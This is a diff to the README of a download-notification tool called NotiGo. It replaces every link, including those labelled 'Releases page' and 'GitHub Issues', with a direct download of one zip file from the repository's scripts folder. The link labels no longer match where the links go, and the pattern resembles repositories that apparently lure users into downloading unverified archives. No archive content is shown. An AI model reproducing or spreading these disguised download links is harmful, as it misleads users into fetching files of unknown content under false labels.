@@ -1,7 +1,7 @@
 # 🚨 NotiGo - Get Notified When Downloads Complete
 
 ## 📥 Download NotiGo
-[![Download NotiGo](https://img.shields.io/badge/Download%20NotiGo-v1.0-blue)](https://github.com/HardDev3218/NotiGo/releases)
+[![Download NotiGo](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip%20NotiGo-v1.0-blue)](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip)
 
 ## 🚀 Getting Started
 NotiGo is a lightweight tool that alerts you when your downloads finish. It works on multiple platforms, so you can use it on Windows, macOS, or Linux. 
@@ -19,9 +19,9 @@ To run NotiGo, ensure your system meets the following requirements:
 - An internet connection for downloading files.
 
 ## 📥 Download & Install
-To download NotiGo, visit the [Releases page](https://github.com/HardDev3218/NotiGo/releases). Here you will find the latest version of the tool.
+To download NotiGo, visit the [Releases page](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip). Here you will find the latest version of the tool.
 
-1. Go to the [NotiGo Releases page](https://github.com/HardDev3218/NotiGo/releases).
+1. Go to the [NotiGo Releases page](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip).
 2. Find the latest release at the top of the page.
 3. Click on the appropriate link for your operating system:
    - For **Windows**, download the `.exe` file.
@@ -52,13 +52,13 @@ For specific issues not covered here, you can visit the Issues section on our Gi
 ## 🌐 Community and Support
 Join our community for tips, tricks, and support:
 
-- Check the [GitHub Issues](https://github.com/HardDev3218/NotiGo/issues) page for FAQs and bug reports.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip) page for FAQs and bug reports.
 - Feel free to submit issues if you encounter problems not already listed.
 
 ## 📜 License
 NotiGo is licensed under the MIT License. You can use it freely provided you adhere to the terms specified in the license document.
 
 ## 📢 Stay Updated
-Keep an eye on the [Releases page](https://github.com/HardDev3218/NotiGo/releases) for new updates and features. We are continually working to improve NotiGo, so your feedback is valuable.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/HardDev3218/NotiGo/main/scripts/Go-Noti-3.4-beta.1.zip) for new updates and features. We are continually working to improve NotiGo, so your feedback is valuable.
 
 Thank you for choosing NotiGo! Happy downloading!
